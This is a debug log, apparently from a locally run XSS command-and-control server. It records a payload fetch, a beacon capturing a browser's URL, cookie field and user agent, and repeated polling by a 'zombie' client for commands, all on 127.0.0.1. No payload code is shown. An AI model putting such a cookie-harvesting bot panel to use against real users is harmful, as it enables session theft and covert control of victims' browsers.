2025-06-25 00:03:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:40] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:03:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:03:40 | INFO     | control_route.py:21 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:03:40 | INFO     | control_route.py:44 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:03:40.717Z"},時間: 2025-06-25 00:03:40.725322
2025-06-25 00:03:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0058s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:03:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:40] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:03:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:41 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0029s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:42 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:43 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:44 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:45 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0021s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:46 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:47 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:49 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:50 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:51 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0022s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:52 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:53 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:54 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:55 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:56 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:57 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:57 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:03:57 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:03:57 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:03:57 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:03:57 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:03:57 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:03:57 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:03:57 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:03:57 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:03:57 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:03:57 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:03:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:58 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:03:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:03:59 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:03:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:03:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:03:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:00 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:01 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:02 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:03 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:04 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:05 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:06 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:07 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:08 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:09 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:10 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:11 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:12 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:13 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:14 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:15 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:16 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:17 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:18 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:18 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:19 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:20 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:21 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:22 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:23 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:24 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:25 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:26 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:27 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:04:28 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:04:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:04:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:04:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:04:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
